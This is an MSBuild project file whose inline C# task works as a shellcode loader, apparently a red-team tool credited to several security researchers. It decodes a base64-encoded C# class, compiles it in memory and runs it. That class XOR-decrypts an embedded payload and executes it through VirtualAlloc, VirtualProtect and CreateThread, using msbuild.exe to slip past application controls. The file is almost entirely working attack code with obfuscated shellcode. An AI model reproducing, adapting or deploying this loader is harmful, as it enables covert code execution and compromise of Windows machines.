<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
  <!-- Created C# payload: Franci Sacer, Twitter: @francisacer1 -->
  <!-- License: BSD 3-Clause -->
  <Target Name="npscsharp">
   <nps />
  </Target>
  <UsingTask
    TaskName="nps"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Collections.Generic;
        using System.Linq;
        using System.Text;
        using System.Runtime.InteropServices;
        using System.Collections.ObjectModel;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        using Microsoft.CSharp;
        using System.CodeDom.Compiler;
        using System.Reflection;

        public class nps : Task, ITask
        {
            public override bool Execute()
            {
                Console.WriteLine("hey");
                string cmd = "CnVzaW5nIFN5c3RlbS5UZXh0Owp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIENsYXNzRXhhbXBsZQp7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgTUVNX0NPTU1JVCA9IDB4MTAwMDsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBQQUdFX1JFQURXUklURSA9IDB4MDQ7CiAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgUEFHRV9FWEVDVVRFX1JFQUQgPSAweDIwOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBVSW50MzIgVmlydHVhbEFsbG9jKFVJbnQzMiBscFN0YXJ0QWRkciwgVUludDMyIHNpemUsIFVJbnQzMiBmbEFsbG9jYXRpb25UeXBlLCBVSW50MzIgZmxQcm90ZWN0KTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgYWRkcmVzcywgVUludDMyIHNpemUsIFVJbnQzMiBuZXdQcm90ZWN0LCBvdXQgVUludDMyIG9sZFByb3RlY3QpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlVGhyZWFkKAogICAgICAgIFVJbnQzMiBscFRocmVhZEF0dHJpYnV0ZXMsCiAgICAgICAgVUludDMyIGR3U3RhY2tTaXplLAogICAgICAgIFVJbnQzMiBscFN0YXJ0QWRkcmVzcywKICAgICAgICBJbnRQdHIgcGFyYW0sCiAgICAgICAgVUludDMyIGR3Q3JlYXRpb25GbGFncywKICAgICAgICByZWYgVUludDMyIGxwVGhyZWFkSWQKICAgICk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBXYWl0Rm9yU2luZ2xlT2JqZWN0KEludFB0ciBoSGFuZGxlLCBVSW50MzIgZHdNaWxsaXNlY29uZHMpOwogICAgcHVibGljIHZvaWQgRXhlY3V0ZSgpIHsKICAgICAgICBzdHJpbmcgcmF3ID0gQCJSQVFMRUJJUk16VmhFQzg5R1NJUEpEOS9LU2NDZWlzZU9tRTdJVkZxQ0Q0UWRpa0VIQ1FnZnhrUEdqczFFVHNIY1JRSkFSQVFCUWRpT0NJRFBYOFdBQllaQmo5b0VEVWNFUmtuSlFVUElBSStFaFlKR2hFNklGRnBLZ2hnT3owRlB6UTdIQ292T3l0OFpnZzJRaTV4RXl3N0p5Z3lLREVVRFMwRlpEVURJRVVOSHlnZEF3SWNEV1o4Q1J3dkRoY2ZCQklGTmdodE1oUTlOZ1VlUHhzNU95RU5GakVLQmg0VmJUOXVOZ3h3ZEM0L05pUWlBUjFUUERFOUpFUjVIaWxpTlJaNFB3QUpBQjBQTWpzYmZHa25EQXBvRHdVQmNBTWJZQXBjRVNvS0lCMHhZd0lFV2g0NU9SZzdHRG9iRFNrL1BYa09KZ2tYUzBkYklBTWVBZ0lNZlJva0xXY2lEVEFxTWdjZ0dGbzNFQ2NhT0hrNEdUY3FLUThoRFNzZUEwWURjd29ESWpVV09TTWZDd3c4TW5rV0pSSVhGVUp1Tnl3L2UzZ2JHd044QnhRK2VpdzhKaWMzTlhrV0tCSVZFQXdPR24wbEtnNGRXMlVBWXhZOVhBNXdPUmx4RndJQkdERmlKbmtTT1FJN05CaHNEaHNMR2hVZkpUSWpHRGs4SGhWbUhSZ2pSV2xvS1IwRkxYVjlCQ01EWkRrVERXQUpDQllPYVRNWEdneHhJU2NESkQ1a1BRNHNPd1VXRmdOMmFRczhEaXdoQ1FBV0loYzVERk0rQURzZ0htSTBLU2tDTHdnN0JYOEVHQW9nTkI0ZU95c0FkaHd1SmhrRWVBTVlJRDRkQ2g0S0FnQVhTa2QzQVJzbUFSZDBlemNhQzJJK2VWTTdBZ1lXRG5VTUN4Y0hCeWsxTlJzbEtnb2VHaUFDT3dZNFhBMGxKaG9XQXdNYkl3TmlKUjRHQVI0VkdReDJhQ2s2R2haOEtSZ0pYUjBPSFRnY0FTbzBKbTgwY0JNTkZ5azNNaGdNQlFsNk5EVWRHQm9mV1NCd0p3TVhQUUEwSWdkak9uc3dJekZpUEIxMkh4c2hOd2twTlJnSUdEMC9Kd0VrTUFZalJXc09DeEliQ1NrNU5TSTZDUWg1RGdZSFlSVUFXUTBIWUFKekN5SUZmQ0VSUGd3S0N6b0tYVE1YWUJZYkxDMERJQmNLSkRjRERTd0hCbUVXSUc0MEt5TUNFbmw0ZVhjL0J3b3NFalV5R1RNT2VSZ0NHMkFHSWdvRENRYzJQU1lLWWdFZ1JETVhZQmNGQVhBREd3QWpEeVFwSXdwa2ZHa2xNazhSRkFRMUNDb2JGdzhxUHprYkkySm5BRjBpYkdvWkgySUVQZzRYRHlvaE9nd0ZFaFlSTXpWWkdBQVFCUUFQR3pjSUFUcytZRHA4WWdvOElHMXRMejhDY3lvT0h3OHBFVDU2T0R3V0lCTStEQzl1Qnp3aUQzOHNlaHNZS2lndEZTUVlLaGh2RkE4M1lnWTdZSGxoVUNna0NGWXJIaW96QVhVTkptSVlLd1EzR3prcloxTUhOVG9GUFIwMWJYWnVCdz09IjsKICAgICAgICBieXRlW10gc2hlbGxjb2RlID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHhvckl0KCJrS2JTU1BydDhZQVFUQU1PVk5oUCIsIEJhc2U2NERlY29kZShyYXcpKSk7CiAgICAgICAgVUludDMyIGZ1bmNBZGRyID0gVmlydHVhbEFsbG9jKDAsIChVSW50MzIpc2hlbGxjb2RlLkxlbmd0aCwgTUVNX0NPTU1JVCwgUEFHRV9SRUFEV1JJVEUpOwogICAgICAgIE1hcnNoYWwuQ29weShzaGVsbGNvZGUsIDAsIChJbnRQdHIpKGZ1bmNBZGRyKSwgc2hlbGxjb2RlLkxlbmd0aCk7CiAgICAgICAgVUludDMyIG9sZFByb3RlY3Q7CiAgICAgICAgVmlydHVhbFByb3RlY3QoKEludFB0cikoZnVuY0FkZHIpLCAoVUludDMyKXNoZWxsY29kZS5MZW5ndGgsIFBBR0VfRVhFQ1VURV9SRUFELCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgSW50UHRyIGhUaHJlYWQgPSBJbnRQdHIuWmVybzsKICAgICAgICBVSW50MzIgdGhyZWFkSWQgPSAwOwogICAgICAgIEludFB0ciBwaW5mbyA9IEludFB0ci5aZXJvOwogICAgICAgIGhUaHJlYWQgPSBDcmVhdGVUaHJlYWQoMCwgMCwgZnVuY0FkZHIsIHBpbmZvLCAwLCByZWYgdGhyZWFkSWQpOwogICAgICAgIFdhaXRGb3JTaW5nbGVPYmplY3QoaFRocmVhZCwgMHhGRkZGRkZGRik7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgeG9ySXQoc3RyaW5nIGtleSwgc3RyaW5nIGlucHV0KQogICAgewogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwogICAgICAgIGZvcihpbnQgaT0wOyBpIDwgaW5wdXQuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHNiLkFwcGVuZCgoY2hhcikoaW5wdXRbaV0gXiBrZXlbKGkgJSBrZXkuTGVuZ3RoKV0pKTsKICAgICAgICBTdHJpbmcgcmVzdWx0ID0gc2IuVG9TdHJpbmcoKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NEVuY29kZShzdHJpbmcgdGV4dCkgewogICAgICAgcmV0dXJuIFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0Qnl0ZXModGV4dCkpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NERlY29kZShzdHJpbmcgZW5jb2RlZHRleHQpIHsKCSAgICByZXR1cm4gU3lzdGVtLlRleHQuRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNvZGVkdGV4dCkpOwogICAgfQp9";
                CSharpCodeProvider nps = new CSharpCodeProvider();
                CompilerParameters parameters = new CompilerParameters();
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                parameters.GenerateExecutable = false;
                parameters.GenerateInMemory = true;
                parameters.IncludeDebugInformation = false;
                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
                Assembly assembly = results.CompiledAssembly;
                object obj = assembly.CreateInstance("ClassExample");
                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
                return true;
            }

            public static string Base64Encode(string text) {
               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
            }

            public static string Base64Decode(string encodedtext) {
                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
